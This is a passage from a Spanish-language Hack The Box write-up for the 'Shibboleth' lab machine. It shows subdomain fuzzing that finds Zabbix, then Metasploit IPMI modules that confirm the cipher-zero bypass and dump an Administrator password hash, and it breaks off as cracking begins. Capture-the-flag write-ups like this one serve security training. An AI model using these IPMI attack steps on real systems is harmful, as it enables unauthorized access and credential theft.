&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ ffuf -w bitquark-subdomains-top100000.txt -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.shibboleth.htb&amp;#34;&lt;/span&gt; -u http://shibboleth.htb -fw &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;

        /&lt;span class=&#34;s1&#34;&gt;&amp;#39;___\  /&amp;#39;&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;          /&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/ /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/  __  __  /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_/
       &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\/\ \/\ \ \ \ &lt;/span&gt;,__&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;/ &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\ \ \_\ \ \ \ \_&lt;/span&gt;/
         &lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;___/  &lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/   &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;___/    &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/

       v1.3.1 Kali Exclusive &amp;lt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb
 :: Wordlist         : FUZZ: bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
 :: Calibration      : &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
 :: Timeout          : &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
 :: Threads          : &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;
________________________________________________

monitor                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Status: 200, Size: 3686, Words: 192, Lines: 30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
monitoring              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Status: 200, Size: 3686, Words: 192, Lines: 30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
zabbix                  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Status: 200, Size: 3686, Words: 192, Lines: 30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
:: Progress: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;100000/100000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: Job &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1/1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: &lt;span class=&#34;m&#34;&gt;364&lt;/span&gt; req/sec :: Duration: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0:07:06&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; :: Errors: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ::
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;zabbix&#34;&gt;Zabbix&lt;/h2&gt;
&lt;p&gt;En los tres subdominios encontrados se muestra el login de Zabbix, con los links que se muestran por debajo podemos decir que la version es &lt;a href=&#34;https://www.zabbix.com/documentation/5.0/&#34;&gt;zabbix 5.0&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/shibboleth/Screenshot_20211124_192526.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Si revisamos algun exploit o vulnerabilidad para esta version se muestra un XSS pero es necesario ingresar como administrador, tambien encontramos el &lt;a href=&#34;https://www.horizon3.ai/cve-2021-27927-csrf-to-rce-chain-in-zabbix/&#34;&gt;CVE-2021-27927&lt;/a&gt; aunque es necesaria la interacci√≥n del administrador.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ searchsploit zabbix 5.0
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Path
---------------------------------------------------------- ---------------------------------
Zabbix 5.0.0 - Stored XSS via URL Widget Iframe           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/49202.txt
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;bmc-server&#34;&gt;BMC Server&lt;/h2&gt;
&lt;p&gt;La informacion del footer nos llevo a &lt;a href=&#34;https://docs.bmc.com/docs/ServerAutomation/82/using/provisioning/bare-metal-provisioning-tasks-and-stages#Baremetalprovisioningtasksandstages-Overview&#34;&gt;BMC Server Automation&lt;/a&gt; adem√°s encontramos que utiliza el &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/623-udp-ipmi#discovery&#34;&gt;puerto UDP 623&lt;/a&gt; aunque &lt;a href=&#34;https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/#networkservices&#34;&gt;depende del proveedor&lt;/a&gt; algunos ofrecen una interfaz de administracion web, telnet ssh y el protocolo IPMI (udp/623).&lt;/p&gt;
&lt;p&gt;Tras escanear la maquina vemos que el puerto 623 est√° abierto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ sudo nmap -n -sU -p &lt;span class=&#34;m&#34;&gt;623&lt;/span&gt; shibboleth.htb
Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-11-25 01:43 UTC
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; shibboleth.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.124&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 0.70 seconds
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ipmi&#34;&gt;IPMI&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0&#34;&gt;Hacktricks&lt;/a&gt; lista algunas vulnerabilidades en el protocolo IPMI, donde vemos algunos modulos auxiliares y exploits de metasploit. La &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0&#34;&gt;primera vulnerabilidad&lt;/a&gt; parece estar presente segun la ejecucion del modulo en metasploit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ msfconsole -q
msf6 &amp;gt; use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_cipher_zero&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;auxiliary/scanner/ipmi/ipmi_cipher_zero&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;              yes       The number of hosts to probe in each &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
   RHOSTS                      yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      &lt;span class=&#34;m&#34;&gt;623&lt;/span&gt;              yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UDP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   THREADS    &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;               yes       The number of concurrent threads

msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_cipher_zero&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts shibboleth.htb
&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; shibboleth.htb
msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_cipher_zero&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending IPMI requests to 10.10.11.124-&amp;gt;10.10.11.124 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; cipher zero
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Scanned &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100% &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Auxiliary module execution completed
msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_cipher_zero&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al realizar una enumeracion con una lista de usuarios no logramos encontrar alguno.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; line&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ipmitool -C &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; -H shibboleth.htb -U &lt;span class=&#34;nv&#34;&gt;$line&lt;/span&gt; -P root user list&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt; &amp;lt; top-usernames-shortlist.txt
root
Invalid user name
Error: Unable to establish LAN session
Error: Unable to establish IPMI v1.5 / RMCP session
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
zabbix
Invalid user name
Error: Unable to establish LAN session
Error: Unable to establish IPMI v1.5 / RMCP session
 œÄ ~/htb/shibboleth ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La &lt;a href=&#34;https://book.hacktricks.xyz/pentesting/623-udp-ipmi#vulnerability-ipmi-2.0-rakp-authentication-remote-password-hash-retrieval&#34;&gt;segunda vulnerabilidad&lt;/a&gt; de igual forma est√° presente, por lo que nos permiti√≥ obtener el hash del usuario &lt;code&gt;Administrator&lt;/code&gt; utilizando wordlist de metasploit para usuario y contrase√±a.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_dumphashes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options

Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;auxiliary/scanner/ipmi/ipmi_dumphashes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:

   Name                  Current Setting                                            Required  Description
   ----                  ---------------                                            --------  -----------
   CRACK_COMMON          &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;                                                       yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                              no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                             no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passw  yes       File containing common passwords &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; offline cracking, one per line
                         ords.txt
   RHOSTS                shibboleth.htb                                             yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 &lt;span class=&#34;m&#34;&gt;623&lt;/span&gt;                                                        yes       The target port
   SESSION_MAX_ATTEMPTS  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;                                                          yes       Maximum number of session retries, required on certain BMCs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HP iLO 4, etc&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   SESSION_RETRY_DELAY   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;                                                          yes       Delay between session retries in seconds
   THREADS               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                                                          yes       The number of concurrent threads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;max one per host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users  yes       File containing usernames, one per line
                         .txt

msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_dumphashes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.11.124:623 - IPMI - Hash found: Administrator:3eea1697840a00006d671b96156fffe6876482d6e609077b3bd1b85e1c527df0f33fad868ed1afeea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:5070ad3baff2f7a8e31447d7fdb0406d9d7ca623
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Scanned &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100% &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Auxiliary module execution completed
msf6 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;scanner/ipmi/ipmi_dumphashes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La descripcion del modulo nos muestra un script que permite crackear el hash y adem√°s el tipo de hash en hashcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Description:
  This module identifies IPMI 2.0-compatible systems and attempts to
  retrieve the HMAC-SHA1 password hashes of default usernames. The
  hashes can be stored in a file using the OUTPUT_FILE option and &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
  cracked using hmac_sha1_crack.rb in the tools subdirectory as well
  hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cpu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.46 or newer using &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; 7300.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando el script mencionado y el wordlist Rockyou logramos obtener la ontrase√±a del usuario en texto plano.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/shibboleth ‚ùØ /usr/share/metasploit-framework/tools/password/hmac_sha1_crack.rb hashes_ipmi &lt;span class=&#34;nv&#34;&gt;$ROCK&lt;/span&gt;
